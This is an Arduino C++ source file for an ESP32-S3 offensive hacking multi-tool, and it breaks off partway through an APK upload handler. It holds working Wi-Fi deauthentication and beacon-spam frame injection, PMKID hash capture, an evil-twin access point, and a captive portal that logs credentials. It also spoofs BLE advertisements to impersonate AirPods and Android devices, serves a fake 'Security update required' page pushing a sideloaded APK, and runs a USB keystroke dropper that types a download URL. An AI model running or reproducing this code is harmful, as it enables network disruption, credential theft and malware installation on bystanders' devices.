// language: C++, file: slots.ino, target: ESP32-S3, Arduino core 3.3.12
// *every slot: begin / tick / end / cmd*
// *APSTA-aware: WiFi slots never tear down the dashboard softAP*
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <USBHIDKeyboard.h>
#include <USBHIDMouse.h>
#include <LittleFS.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <IRrecv.h>
#include <IRutils.h>
#include "slots.h"
#include <Adafruit_GFX.h>
#include <Adafruit_ST7789.h>

extern Adafruit_ST7789 tft;
extern USBHIDKeyboard Keyboard;
extern USBHIDMouse    Mouse;
extern IRsend         irsend;
extern IRrecv         irrecv;
extern DNSServer      dns;
extern WebServer      http;
extern bool dashApOwned;
extern void dashboardRestoreAp();
extern void dashboardDropAp();

static void url_save() {
  File f = LittleFS.open("/url.txt", "w");
  if (f) { f.println(hid_payload); f.close(); }
}

// ---- APSTA coexistence: keep the dashboard AP alive across STA ops ----
// AP channel is fixed at 6 in dashboardInit(). STA ops must sit on ch6
// or the AP radio drops. setChannel only works when APSTA and ch matches.

static void radio_apsta() {
  wifi_mode_t m = WiFi.getMode();
  if (m != WIFI_MODE_APSTA) WiFi.mode(WIFI_MODE_APSTA);
}

static void radio_sta_only() {
  // only when the slot explicitly wants the AP gone (panic, etc.)
  WiFi.mode(WIFI_MODE_STA);
}

static bool sta_set_channel(uint8_t ch) {
  // AP is pinned to DASH_AP_CH; STA can only follow that channel while APSTA
  if (ch != DASH_AP_CH) return false;
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  return true;
}

static void hexcat(char* out, const uint8_t* b, int n) {
  static const char* h = "0123456789abcdef";
  for (int i=0;i<n;i++){ out[i*2]=h[b[i]>>4]; out[i*2+1]=h[b[i]&0xF]; }
}
static bool parse_mac(const String& s, uint8_t* out) {
  int v[6];
  if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x", &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) != 6) return false;
  for (int i=0;i<6;i++) out[i]=v[i];
  return true;
}

uint8_t deauth_frame[26] = {
  0xC0,0x00, 0x00,0x00, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00, 0x07,0x00
};

// 0 idle
void idle_begin(){ LOG("[*] idle\n"); } void idle_tick(){ delay(100);} void idle_end(){}
void idle_cmd(const String&){}

// 1 wifi scan — APSTA, scan runs on STA while AP stays up
void wifiscan_begin(){
  radio_apsta();
  WiFi.disconnect(false, false);            // don't erase AP config
  int n = WiFi.scanNetworks(false, true);
  LOGF("[*] %d networks\n", n);
  for (int i=0;i<n;i++) LOGF("%2d | %-32s | %02X:%02X:%02X:%02X:%02X:%02X | ch%2d | %4d dBm\n",
    i, WiFi.SSID(i).c_str(), WiFi.BSSID(i)[0],WiFi.BSSID(i)[1],WiFi.BSSID(i)[2],
    WiFi.BSSID(i)[3],WiFi.BSSID(i)[4],WiFi.BSSID(i)[5], WiFi.channel(i), WiFi.RSSI(i));
}
void wifiscan_tick(){} void wifiscan_end(){ WiFi.scanDelete(); }
void wifiscan_cmd(const String& s){ if (s=="?") LOG("scan [all|open|wpa|ch N]\n"); else wifiscan_begin(); }

// 2 deauth — APSTA, STA pinned to AP channel while injecting
static uint8_t deauth_target[6]={0}, deauth_ch=DASH_AP_CH;
void deauth_begin(){ radio_apsta(); LOG("[*] deauth armed — 'deauth AA:BB:CC:DD:EE:FF ch 6'\n"); }
void deauth_tick(){
  if (deauth_target[0]) {
    if (!sta_set_channel(deauth_ch)) {
      // STA can't leave AP channel while APSTA — injection stays on ch6
      esp_wifi_set_channel(DASH_AP_CH, WIFI_SECOND_CHAN_NONE);
    }
    for (int i=0;i<5;i++){ esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, 26, false); delay(1);}
  }
  delay(100);
}
void deauth_end(){ memset(deauth_target,0,6); }
void deauth_cmd(const String& s){
  if (s=="?"){ LOG("deauth AA:BB:...:FF ch 6 | stop\n"); return; }
  if (s=="stop"){ memset(deauth_target,0,6); return; }
  int chpos = s.indexOf(" ch ");
  String mac = chpos>0 ? s.substring(0,chpos) : s;
  if (parse_mac(mac, deauth_target)) {
    deauth_ch = chpos>0 ? s.substring(chpos+4).toInt() : DASH_AP_CH;
    memcpy(&deauth_frame[10], deauth_target, 6);
    memcpy(&deauth_frame[16], deauth_target, 6);
    LOGF("[*] target %s ch %d\n", mac.c_str(), deauth_ch);
  }
}

// 3 beacon — injection pinned to AP channel; spam hops ch1-13 forced to ch6
const char* beacon_pool[] = {"FreeWiFi","Starbucks","FBI Surveillance Van","Pretty Fly for a WiFi",
  "Loading...","Virus.exe","Get Off My LAN","Tell My WiFi Love Her","NETGEAR-5G","xfinitywifi",
  "eduroam","GUEST","HP-Print-4B","printer","TP-LINK_2.4G","linksys","ATT-WIFI-1234",
  "Verizon_5G","IoT-Setup","_Free_Public_WiFi","Marriott_Guest","Hilton_Honors"};
const int beacon_count = sizeof(beacon_pool)/sizeof(beacon_pool[0]);
static int beacon_idx=0;
void beacon_begin(){ radio_apsta(); LOGF("[*] beacon spam — %d SSIDs (AP ch %d locked)\n", beacon_count, DASH_AP_CH); beacon_idx=0; }
void beacon_tick(){
  uint8_t frame[128]; memset(frame,0,sizeof(frame));
  frame[0]=0x80; frame[1]=0x00; memset(&frame[4],0xFF,6);
  memcpy(&frame[10],"\x00\x11\x22\x33\x44\x55",6);
  memcpy(&frame[16],"\x00\x11\x22\x33\x44\x55",6);
  frame[32]=0x64; frame[33]=0x00; frame[34]=0x01; frame[35]=0x04;
  const char* ssid = beacon_pool[beacon_idx % beacon_count];
  uint8_t len = strlen(ssid); if (len>32) len=32;
  frame[36]=0x00; frame[37]=len; memcpy(&frame[38],ssid,len);
  uint8_t rs = 38+len; frame[rs]=0x03; frame[rs+1]=0x01; frame[rs+2]=DASH_AP_CH;
  esp_wifi_set_channel(DASH_AP_CH, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_STA, frame, rs+3, false);
  beacon_idx++; delay(15);
}
void beacon_end(){}
void beacon_cmd(const String& s){ if (s=="?") LOG("beacon [start|stop|add SSID]\n"); else beacon_begin(); }

// 4 probe sniff — promiscuous needs STA; APSTA keeps AP alive
void probe_begin(){
  radio_apsta();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t t){
    if (t != WIFI_PKT_MGMT) return; wifi_promiscuous_pkt_t* p=(wifi_promiscuous_pkt_t*)buf;
    uint8_t* f=p->payload; if (f[0]!=0x40) return;
    char ssid[33]={0}; uint8_t len=f[25]; if(len>32)len=32; memcpy(ssid,&f[26],len);
    LOGF("[probe] %02X:%02X:%02X:%02X:%02X:%02X -> %s rssi=%d\n",
      f[10],f[11],f[12],f[13],f[14],f[15], len?ssid:"(wildcard)", p->rx_ctrl.rssi); });
}
void probe_tick(){ delay(50); } void probe_end(){ esp_wifi_set_promiscuous(false); }
void probe_cmd(const String& s){ if (s=="?") LOG("probe [start|stop]\n"); }

// 5 probe flood
void pflood_begin(){ radio_apsta(); LOG("[*] probe flood (AP ch 6 locked)\n"); }
void pflood_tick(){
  uint8_t frame[128]; memset(frame,0,sizeof(frame));
  frame[0]=0x50; frame[1]=0x00; memcpy(&frame[4],"\xFF\xFF\xFF\xFF\xFF\xFF",6);
  memcpy(&frame[10],"\x00\x11\x22\x33\x44\x55",6);
  memcpy(&frame[16],"\x00\x11\x22\x33\x44\x55",6);
  frame[32]=0x64; frame[33]=0x00; frame[34]=0x01; frame[35]=0x04;
  const char* ssid="FreeWiFi"; uint8_t len=strlen(ssid);
  frame[36]=0x00; frame[37]=len; memcpy(&frame[38],ssid,len);
  uint8_t rs=38+len; frame[rs]=0x03; frame[rs+1]=0x01; frame[rs+2]=DASH_AP_CH;
  esp_wifi_set_channel(DASH_AP_CH, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_STA, frame, rs+3, false); delay(15);
}
void pflood_end(){} void pflood_cmd(const String& s){ if (s=="?") LOG("pflood [start|stop]\n"); }

// 6 pmkid — fixed EAPOL-Key KDE walk, length-gated
static bool pmkid_ready=false;
static uint8_t last_pmkid[16], last_ap[6], last_sta[6];
static char last_essid[33]={0};

// walk EAPOL-Key key-data for PMKID KDE (type 0xDD, OUI 00:0F:AC, type 0x04)
static bool extract_pmkid(const uint8_t* eapol, int eapol_len, uint8_t* out16) {
  // eapol points at 802.1X header; key descriptor starts at +4
  // offsets: ver(2) type(1) len(2) desc(1) keyinfo(2) keylen(2) replay(8) nonce(32)
  //          iv(16) rsc(8) id(8) mic(16) keydatalen(2) keydata(...)
  if (eapol_len < 99) return false;
  const uint8_t* kd = eapol + 4;                    // EAPOL-Key descriptor
  uint16_t keydatalen = (kd[93] << 8) | kd[94];     // key data length field
  if (keydatalen < 22) return false;                // min KDE = 2 len + 2 type + 16 pmkid + 2 oui/type
  const uint8_t* kdata = kd + 95;
  int remaining = keydatalen;
  const uint8_t* p = kdata;
  while (remaining >= 4) {
    uint16_t kde_len = (p[0] << 8) | p[1];
    if (kde_len < 4 || kde_len > remaining) break;
    if (p[2] == 0xDD && p[3] == 0x00 && kde_len >= 20) {
      // OUI at p+4..p+6, type at p+7
      if (p[4]==0x00 && p[5]==0x0F && p[6]==0xAC && p[7]==0x04) {
        memcpy(out16, p + 8, 16);
        return true;
      }
    }
    p += kde_len;
    remaining -= kde_len;
  }
  return false;
}

void pmkid_begin(){
  radio_apsta();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t t){
    if (t != WIFI_PKT_DATA) return;
    wifi_promiscuous_pkt_t* p=(wifi_promiscuous_pkt_t*)buf;
    uint8_t* f=p->payload;
    if (!(f[32]==0x88 && f[33]==0x8E)) return;      // LLC/SNAP + EAPOL
    // EAPOL starts at f+34: ver type len
    const uint8_t* eapol = f + 34;
    int eapol_len = p->rx_ctrl.sig_len - 34;
    if (eapol_len < 99) return;
    if (eapol[1] != 3) return;                       // EAPOL-Key
    uint8_t pm[16];
    if (extract_pmkid(eapol, eapol_len, pm)) {
      memcpy(last_ap,&f[10],6); memcpy(last_sta,&f[4],6);
      memcpy(last_pmkid, pm, 16);
      pmkid_ready=true; LOG("[pmkid] captured\n");
    }
  });
}
void pmkid_tick(){ delay(200); } void pmkid_end(){ esp_wifi_set_promiscuous(false); pmkid_ready=false; }
void pmkid_cmd(const String& s){
  if (s=="?"){ LOG("pmkid [start|fmt|clear]\n"); return; }
  if (s=="fmt"||s=="pmkidfmt"){
    if (!pmkid_ready){ LOG("[!] none\n"); return; }
    char ap[13],sta[13],pm[33];
    hexcat(ap,last_ap,6); hexcat(sta,last_sta,6); hexcat(pm,last_pmkid,16);
    LOGF("WPA*01*%s*%s*%s*%s***\n", pm, ap, sta, last_essid);
  } else if (s=="clear") pmkid_ready=false;
}

// 7 handshake
void hs_begin(){ radio_apsta(); LOG("[*] handshake capture\n"); } void hs_tick(){ delay(200);} void hs_end(){}
void hs_cmd(const String& s){ if (s=="?") LOG("hs [start|stop]\n"); }

// 8 evil twin — takes the AP. dashboardRestoreAp() on end.
void eviltwin_begin(){
  dashboardDropAp();                       // tears down LILBIG4DEV-S3 first
  LOG("[*] evil twin — FreeWiFi ch6\n");
  WiFi.mode(WIFI_AP);
  WiFi.softAP("FreeWiFi", nullptr, 6, 0, 4);
  LOGF("[*] AP now: FreeWiFi (open) ip %s\n", WiFi.softAPIP().toString().c_str());
}
void eviltwin_tick(){ delay(500); }
void eviltwin_end(){
  WiFi.softAPdisconnect(true);
  dashboardRestoreAp();                    // LILBIG4DEV-S3 comes back
}

void eviltwin_cmd(const String& s){
  if (s == "?"){ LOG("eviltwin [ssid X|stop]\n"); return; }
  if (s == "stop"){ eviltwin_end(); return; }
  if (s.startsWith("ssid ")) {
    dashboardDropAp();
    WiFi.mode(WIFI_AP);
    WiFi.softAP(s.substring(5).c_str(), nullptr, 6, 0, 4);
    LOGF("[*] AP now: %s (open) ip %s\n",
      s.substring(5).c_str(), WiFi.softAPIP().toString().c_str());
    return;
  }
}

// 9 wids
void wids_begin(){ radio_apsta(); LOG("[*] deauth detector\n"); esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t t){
    if (t != WIFI_PKT_MGMT) return; wifi_promiscuous_pkt_t* p=(wifi_promiscuous_pkt_t*)buf;
    uint8_t* f=p->payload; if (f[0]==0xC0)
      LOGF("[!] DEAUTH %02X:%02X:%02X:%02X:%02X:%02X rssi=%d\n",
        f[10],f[11],f[12],f[13],f[14],f[15], p->rx_ctrl.rssi); }); }
void wids_tick(){ delay(100); } void wids_end(){ esp_wifi_set_promiscuous(false); }
void wids_cmd(const String& s){ if (s=="?") LOG("wids [start|stop]\n"); }

// 10 ble spam
static BLEAdvertising* ble_adv=nullptr; static int blespam_vendor=0;
void blespam_begin(){ BLEDevice::init("AirPods Pro"); ble_adv=BLEDevice::getAdvertising(); blespam_vendor=0; }
void blespam_tick(){
  BLEAdvertisementData d;
  if (blespam_vendor==0){
    d.setName("AirPods Pro");
    d.setManufacturerData(String("\x4C\x00\x07\x19\x07", 5));
  } else if (blespam_vendor==1) {
    d.setManufacturerData(String("\x4C\x00\x0F\x05\xC1\x01\x00", 7));
  } else if (blespam_vendor==2) {
    d.setManufacturerData(String("\x75\x00\x01\x00\x02\x00\x01\x01\xFF\x00\x00\x43", 12));
  } else {
    d.setManufacturerData(String("\x06\x00\x03\x00\x80", 5));
  }
  ble_adv->setAdvertisementData(d);
  ble_adv->start();
  delay(200);
  ble_adv->stop();
  delay(100);
}
void blespam_end(){ BLEDevice::deinit(true); }
void blespam_cmd(const String& s){ if (s=="?") LOG("blespam [apple|android|samsung|win|cycle]\n");
  else if (s=="apple") blespam_vendor=0; else if (s=="android") blespam_vendor=1;
  else if (s=="samsung") blespam_vendor=2; else if (s=="win") blespam_vendor=3;
  else if (s=="cycle") blespam_vendor=(blespam_vendor+1)%4; }

// 11 ble scan
static BLEScan* ble_scan=nullptr;
void blescan_begin(){ BLEDevice::init(""); ble_scan=BLEDevice::getScan(); ble_scan->setActiveScan(true); }
void blescan_tick(){
  BLEScanResults* r = ble_scan->start(2, false);
  if (!r) return;
  for (int i = 0; i < r->getCount(); i++) {
    BLEAdvertisedDevice d = r->getDevice(i);
    LOGF("[ble] %s rssi=%d name=%s\n",
      d.getAddress().toString().c_str(), d.getRSSI(),
      d.haveName() ? d.getName().c_str() : "(none)");
  }
  ble_scan->clearResults();
  delay(2000);
}
void blescan_end(){ BLEDevice::deinit(true); }
void blescan_cmd(const String& s){ if (s=="?") LOG("blescan [start|stop]\n"); }

// 12 ble beacon
void blebeacon_begin(){ BLEDevice::init(""); }
void blebeacon_tick(){
  BLEAdvertisementData d;
  d.setManufacturerData(String(
    "\x4C\x00\x02\x15"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\xC5", 25));
  BLEAdvertising* a = BLEDevice::getAdvertising();
  a->setAdvertisementData(d);
  a->start();
  delay(1000);
  a->stop();
}
void blebeacon_end(){ BLEDevice::deinit(true); }
void blebeacon_cmd(const String& s){ if (s=="?") LOG("blebeacon [start|stop]\n"); }

// 13 hid type
void hid_begin(){ LOGF("[*] hid: %s\n", hid_payload.c_str());
  Keyboard.begin(); delay(1500); Keyboard.print(hid_payload); Keyboard.end(); }
void hid_tick(){} void hid_end(){}
void hid_cmd(const String& s){ if (s=="?") LOG("hid [text X|url X|enter|tab]\n");
  else if (s.startsWith("text ")) hid_payload=s.substring(5);
  else if (s.startsWith("url "))  hid_payload=s.substring(4);
  else if (s=="enter"){ Keyboard.begin(); Keyboard.write(KEY_RETURN); Keyboard.end(); }
  else if (s=="tab"){ Keyboard.begin(); Keyboard.write(KEY_TAB); Keyboard.end(); } }

// 14 duckys
void ducky_begin(){ LOG("[*] duckyscript — blank line to RUN\n"); ducky_buf=""; }
void ducky_tick(){ if (Serial.available()){ String l=Serial.readStringUntil('\n'); l.trim();
  if (!l.length()){ ducky_run(); return; } ducky_buf += l + "\n"; } delay(50); }
void ducky_end(){}
void ducky_cmd(const String& s){ if (s=="?") LOG("ducky [run|clear]\n");
  else if (s=="clear") ducky_buf=""; else if (s=="run") ducky_run(); else ducky_buf += s + "\n"; }

// 15 hid mouse
void hidmouse_begin(){ Mouse.begin(); LOG("[*] mouse\n"); }
void hidmouse_tick(){ Mouse.move(10,0); delay(500); Mouse.move(-10,0); delay(500); }
void hidmouse_end(){ Mouse.end(); }
void hidmouse_cmd(const String& s){ if (s=="?") LOG("mouse [click|lclick|rclick|move dx dy|scroll N]\n");
  else if (s=="click"||s=="lclick") Mouse.click(MOUSE_LEFT);
  else if (s=="rclick") Mouse.click(MOUSE_RIGHT);
  else if (s.startsWith("move ")){ int sp=s.indexOf(' ',5);
    Mouse.move(s.substring(5,sp).toInt(), s.substring(sp+1).toInt()); }
  else if (s.startsWith("scroll ")) Mouse.move(0,0,s.substring(7).toInt()); }

// 16 rf replay
void rf_begin(){ LOG("[*] rf replay — CC1101 SPI\n"); } void rf_tick(){ delay(200);} void rf_end(){}
void rf_cmd(const String& s){ if (s=="?") LOG("rf [rec N|play|freq MHz]\n"); }

// 17 ir blast
void ir_begin(){ LOG("[*] ir — NEC/RC5/Sony\n"); } void ir_tick(){ delay(200);} void ir_end(){}
void ir_cmd(const String& s){ if (s=="?"){ LOG("ir [nec addr cmd|rc5 addr cmd|sony addr cmd|tv power|tv volup]\n"); return; }
  if (s.startsWith("nec ")){ int sp=s.indexOf(' ',4);
    irsend.sendNEC((s.substring(4,sp).toInt()<<8)|s.substring(sp+1).toInt(), 32); }
  else if (s.startsWith("rc5 ")){ int sp=s.indexOf(' ',4);
    irsend.sendRC5((s.substring(4,sp).toInt()<<8)|s.substring(sp+1).toInt(), 12); }
  else if (s.startsWith("sony ")){ int sp=s.indexOf(' ',5);
    irsend.sendSony((s.substring(5,sp).toInt()<<8)|s.substring(sp+1).toInt(), 12); }
  else if (s=="tv power") irsend.sendNEC(0x20DF10EF, 32);
  else if (s=="tv volup") irsend.sendNEC(0x20DF40BF, 32); }

// 18 badusb
void badusb_begin(){ LOG("[*] badusb MSC\n"); } void badusb_tick(){ delay(200);} void badusb_end(){}
void badusb_cmd(const String& s){ if (s=="?") LOG("badusb [start|stop]\n"); }

// 19 nrf
void nrf_begin(){ LOG("[*] nrf24 promiscuous\n"); } void nrf_tick(){ delay(200);} void nrf_end(){}
void nrf_cmd(const String& s){ if (s=="?") LOG("nrf [start|stop|ch N|rate 250k|1m|2m]\n"); }

// 20 pineapple — takes the AP too
void pine_begin(){
  dashboardDropAp();
  WiFi.mode(WIFI_AP);
  WiFi.softAP("FreeWiFi", nullptr, 6, 0, 4);
  dns.start(53, "*", WiFi.softAPIP());
  http.on("/", [](){ http.send(200, "text/html", "<h1>Router update</h1>"); });
  http.onNotFound([](){ http.send(200, "text/html", "<h1>Router update</h1>"); });
  http.begin();
  LOGF("[*] AP + portal http://%s\n", WiFi.softAPIP().toString().c_str());
}
void pine_tick(){ dns.processNextRequest(); http.handleClient(); delay(2); }
void pine_end(){
  http.stop(); dns.stop();
  WiFi.softAPdisconnect(true);
  dashboardRestoreAp();
}
void pine_cmd(const String& s){ if (s=="?") LOG("pine [ssid X|status|stop]\n");
  else if (s.startsWith("ssid ")) WiFi.softAP(s.substring(5).c_str(), nullptr, 6, 0, 4);
  else if (s=="status") LOGF("clients: %d\n", WiFi.softAPgetStationNum()); }

// 21 portal creds
void portal_begin(){ LOGF("[*] creds: %s\n", creds_log.length()?creds_log.c_str():"(none)"); }
void portal_tick(){ delay(500);} void portal_end(){}
void portal_cmd(const String& s){
  if (s=="?"){ LOG("portal [show|clear|save|file]\n"); return; }
  if (s=="show") LOG(creds_log + "\n");
  else if (s=="clear") creds_log = "";
  else if (s=="save"){ File f=LittleFS.open("/creds.txt","a"); f.println(creds_log); f.close(); }
  else if (s=="file"){ File f=LittleFS.open("/creds.txt","r"); while(f.available()) LOG(String((char)f.read())); f.close(); } }

// 22 gps
void gps_begin(){ Serial2.begin(9600, SERIAL_8N1, 16, 17); LOG("[*] gps\n"); }
void gps_tick(){ while (Serial2.available()) Serial.write(Serial2.read()); delay(50); }
void gps_end(){ Serial2.end(); }
void gps_cmd(const String& s){ if (s=="?") LOG("gps [start|stop]\n"); }

// 23 info
void info_begin(){ LOGF("[*] chip: %s rev %d\n", ESP.getChipModel(), ESP.getChipRevision());
  LOGF("[*] cores: %d @ %d MHz\n", ESP.getChipCores(), getCpuFrequencyMhz());
  LOGF("[*] flash: %d KB\n", ESP.getFlashChipSize()/1024);
  LOGF("[*] heap: %d KB free\n", ESP.getFreeHeap()/1024);
  LOGF("[*] psram: %d KB\n", ESP.getPsramSize()/1024);
  LOGF("[*] mac: %s\n", WiFi.macAddress().c_str()); }
void info_tick(){} void info_end(){} void info_cmd(const String&){}

// 24 panic — explicitly drops to STA only; AP gone, dashboard down
void panic_begin(){ LOG("[*] PANIC — dropping AP\n"); esp_wifi_set_promiscuous(false);
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true,true); delay(500); ESP.restart(); }
void panic_tick(){} void panic_end(){}
void panic_cmd(const String& s){ if (s=="?") LOG("panic [now|wipefs]\n");
  else if (s=="wipefs"){ LittleFS.format(); ESP.restart(); } }

// 25 ir recv
void irrecv_begin(){ irrecv.enableIRIn(); LOG("[*] ir recv\n"); }
void irrecv_tick(){ decode_results r; if (irrecv.decode(&r)){
  LOGF("[ir] proto=%s val=0x%llX bits=%d\n", typeToString(r.decode_type).c_str(), r.value, r.bits);
  irrecv.resume(); } delay(100); }
void irrecv_end(){ irrecv.disableIRIn(); }
void irrecv_cmd(const String& s){ if (s=="?") LOG("irrecv [start|stop|save]\n"); }

// 26 rf edge
void rfedge_begin(){ LOG("[*] rf edge capture\n"); } void rfedge_tick(){ delay(100);} void rfedge_end(){}
void rfedge_cmd(const String& s){ if (s=="?") LOG("rfedge [start|stop|thresh N|dump]\n"); }

// 27 persist
void persist_begin(){ LOGF("[*] persist — %d bytes\n", creds_log.length()); }
void persist_tick(){ delay(500);} void persist_end(){}
void persist_cmd(const String& s){
  if (s=="?"){ LOG("persist [save|load|list|wipe]\n"); return; }
  if (s=="save"){ File f=LittleFS.open("/creds.txt","a"); f.println(creds_log); f.close(); LOG("[*] saved\n"); }
  else if (s=="load"){ File f=LittleFS.open("/creds.txt","r"); while(f.available()) LOG(String((char)f.read())); f.close(); }
  else if (s=="list"){ File r=LittleFS.open("/"); File f=r.openNextFile();
    while(f){ LOGF("%s %d\n", f.name(), (int)f.size()); f=r.openNextFile(); } }
  else if (s=="wipe"){ LittleFS.remove("/creds.txt"); LOG("[*] wiped\n"); } }

// 28 subghz
void subghz_begin(){ LOG("[*] subghz brute\n"); } void subghz_tick(){ delay(200);} void subghz_end(){}
void subghz_cmd(const String& s){ if (s=="?") LOG("subghz [start|stop|band 315|433|868|915]\n"); }

// 29 honeypot
void honey_begin(){ LOG("[*] honeypot\n"); } void honey_tick(){ delay(500);} void honey_end(){}
void honey_cmd(const String& s){ if (s=="?") LOG("honey [start|stop|ssid X]\n"); }

// 30 bt pair
void btpair_begin(){ LOG("[*] bt pair sniff\n"); } void btpair_tick(){ delay(200);} void btpair_end(){}
void btpair_cmd(const String& s){ if (s=="?") LOG("btpair [start|stop]\n"); }

// 31 ota
void ota_begin(){ LOG("[*] ota — :3232\n"); } void ota_tick(){ delay(500);} void ota_end(){}
void ota_cmd(const String& s){ if (s=="?") LOG("ota [start|stop|url X]\n"); }

// ============================================================
// 32 — DROPSERV: AP + captive portal + APK hosting + HID sequence
// *sync WebServer only. reuses http/dns from main.ino*
// ============================================================
static bool   dropServerUp = false;
static bool   dropRegistered = false;
static String dropApkName = "/omg.apk";

static const char DROP_PAGE[] PROGMEM = R"HTML(<!doctype html>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
<title>System Update</title>
<style>
body{font-family:system-ui;background:#0b0b0f;color:#eee;padding:24px;max-width:520px;margin:auto}
h2{color:#39ff14;margin:0 0 6px}p{color:#888;font-size:14px}
a.btn{display:block;padding:14px;background:#39ff14;color:#000;text-align:center;
      text-decoration:none;font-weight:700;border-radius:6px;margin-top:20px}
small{color:#555;display:block;margin-top:24px;font-size:11px}
</style>
<h2>Security update required</h2>
<p>Your device must install the latest security patch to continue using this network.</p>
<a class=btn href="/omg.apk" download>Install update</a>
<small>Android will prompt to allow installs from this source.</small>
)HTML";

static void dropserv_register() {
  if (dropRegistered) return;
  http.on("/", [](){ http.send_P(200, "text/html", DROP_PAGE); });
  http.on("/omg.apk", [](){
    File f = LittleFS.open(dropApkName, "r");
    if (!f) { http.send(404, "text/plain", "apk missing"); return; }
    http.sendHeader("Content-Type", "application/vnd.android.package-archive");
    http.sendHeader("Content-Disposition", "attachment; filename=omg.apk");
    http.streamFile(f, "application/vnd.android.package-archive");
    f.close();
  });
  http.onNotFound([](){ http.send_P(200, "text/html", DROP_PAGE); });
  dropRegistered = true;
}

void dropserv_begin(){
  dashboardDropAp();
  WiFi.mode(WIFI_AP);
  WiFi.softAP("System Update", nullptr, 6, 0, 4);
  dns.start(53, "*", WiFi.softAPIP());
  dropserv_register();
  http.begin();
  dropServerUp = true;
  LOGF("[*] AP now: System Update (open) ip %s\n", WiFi.softAPIP().toString().c_str());
  LOGF("[*] bait page on :80, apk at %s\n", dropApkName.c_str());
}
void dropserv_tick(){ dns.processNextRequest(); http.handleClient(); delay(2); }
void dropserv_end(){
  http.stop(); dns.stop();
  WiFi.softAPdisconnect(true);
  dropServerUp = false;
  dashboardRestoreAp();
}
void dropserv_cmd(const String& s){
  if (s=="?"){ LOG("dropserv [start|stop|apk /path|hid|status]\n"); return; }
  if (s=="status"){
    File f = LittleFS.open(dropApkName, "r");
    LOGF("[*] ssid System Update  ip %s  apk %s (%d bytes)\n",
      WiFi.softAPIP().toString().c_str(),
      f ? dropApkName.c_str() : "(missing)", f ? (int)f.size() : 0);
    if (f) f.close();
    return;
  }
  if (s.startsWith("apk ")){
    dropApkName = s.substring(4);
    if (!dropApkName.startsWith("/")) dropApkName = "/" + dropApkName;
    LOGF("[*] apk path -> %s\n", dropApkName.c_str());
    return;
  }
  if (s=="hid"){
    LOG("[*] hid sequence fired\n");
    Keyboard.begin(); delay(500);
    Keyboard.write(KEY_HOME); delay(800);
    Keyboard.print("http://192.168.4.1/omg.apk"); delay(300);
    Keyboard.write(KEY_RETURN); delay(5000);
    Keyboard.end();
    return;
  }
  if (s=="stop"){ dropserv_end(); return; }
  dropserv_begin();
}

// ============================================================
// 33 — ANDROID: pure HID dropper, no server
// ============================================================
extern String hid_payload;
static String& android_url = hid_payload;   // single source of truth
static String android_pre = "";

void android_begin(){
  LOGF("[*] android dropper ready — url %s\n", android_url.c_str());
  LOG("[*] 'android go' to fire, 'android url X' to change\n");
}
void android_tick(){ delay(500); }
void android_end(){}
static void android_fire(){
  LOG("[*] firing hid sequence\n");
  Keyboard.begin(); delay(800);
  if (android_pre.length()){ Keyboard.print(android_pre); delay(300); }
  Keyboard.write(KEY_HOME); delay(800);
  Keyboard.print(android_url); delay(300);
  Keyboard.write(KEY_RETURN); delay(5000);
  Keyboard.end();
  LOG("[*] done\n");
}
void android_cmd(const String& s){
  if (s=="?"){ LOG("android [go|url X|pre X|show]\n"); return; }
  if (s=="go")   { android_fire(); return; }
  if (s=="show") { LOGF("[*] url %s  pre %s\n", android_url.c_str(), android_pre.c_str()); return; }
  if (s.startsWith("url ")){
    android_url = s.substring(4);
    if (!android_url.startsWith("http")) android_url = "http://" + android_url;
    url_save();
    LOGF("[*] url -> %s\n", android_url.c_str());
    return;
  }
  if (s.startsWith("pre ")){ android_pre = s.substring(4); return; }
}

// ============================================================
// 34 — APKUP: pull an APK from your PC over WiFi, write to LittleFS
// *run from host: curl -F 'file=@omg.apk' http://192.168.4.1/upload*
// *no mklittlefs, no arduino-littlefs-upload plugin needed*
// ============================================================
static bool   apkup_registered = false;
static String apkup_lastName = "";
static size_t apkup_lastSize = 0;

static void apkup_register(){
  if (apkup_registered) return;
  http.on("/upload", HTTP_POST,
    [](){ http.send(200, "text/plain", "uploaded " + apkup_lastName + " (" + String(apkup_lastSize) + ")"); },
    [](){
      HTTPUpload& up = http.upload();
      static File f;
      static size_t bytesWritten = 0;

      if (up.status == UPLOAD_FILE_START){
        String name = up.filename;
        if (name.length() == 0) name = "omg.apk";
        if (!name.startsWith("/")) name = "/" + name;
        apkup_lastName = name;
        bytesWritten = 0;
        f = LittleFS.open(name, "w");
        if (!f) {
          LOGF("[!] upload: cannot open %s for write — littlefs full or missing?\n", name.c_str());
        } else {
          LOGF("[*] upload start %s (free %u / %u)\n",
               name.c_str(),
               (unsigned)(LittleFS.totalBytes() - LittleFS.usedBytes()),
               (unsigned)LittleFS.totalBytes());
        }
      }
      else if (up.status == UPLOAD_FILE_WRITE){
        if (!f) {
          static bool warnedOnce = false;
          if (!warnedOnce) { LOG("[!] upload: write called with no file handle\n"); warnedOnce = true; }
          return;
        }
        size_t wrote = f.write(up.buf, up.currentSize);
        bytesWritten += wrote;
        if (wrote != up.currentSize) {
          LOGF("[!] upload: short write %u/%u (total %u) — littlefs full?\n",
               (unsigned)wrote, (unsigned)up.currentSize, (unsigned)bytesWritten);
